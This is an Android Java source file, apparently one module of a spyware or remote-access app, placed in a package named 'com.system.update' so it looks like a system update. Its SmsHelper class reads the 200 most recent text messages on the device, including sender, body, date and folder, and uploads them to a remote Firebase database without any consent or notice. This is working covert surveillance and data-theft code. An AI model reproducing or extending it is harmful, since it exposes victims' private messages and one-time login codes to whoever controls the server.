package com.system.update;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.google.firebase.database.DatabaseReference;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SmsHelper {

    public static void pushSms(Context ctx, DatabaseReference dataRef) {
        List<Map<String, Object>> list = new ArrayList<>();
        Uri uri = Uri.parse("content://sms/");
        Cursor c = ctx.getContentResolver().query(uri, null, null, null, "date DESC");
        if (c != null) {
            int addrIdx = c.getColumnIndex("address");
            int bodyIdx = c.getColumnIndex("body");
            int dateIdx = c.getColumnIndex("date");
            int typeIdx = c.getColumnIndex("type");

            int count = 0;
            while (c.moveToNext() && count < 200) {
                Map<String, Object> m = new HashMap<>();
                m.put("address", c.getString(addrIdx));
                m.put("body", c.getString(bodyIdx));
                m.put("date", c.getLong(dateIdx));
                m.put("type", smsTypeName(c.getInt(typeIdx)));
                list.add(m);
                count++;
            }
            c.close();
        }
        dataRef.child("sms").setValue(list);
    }

    private static String smsTypeName(int type) {
        switch (type) {
            case 1: return "INBOX";
            case 2: return "SENT";
            case 3: return "DRAFT";
            case 4: return "OUTBOX";
            default: return "UNKNOWN";
        }
    }
}
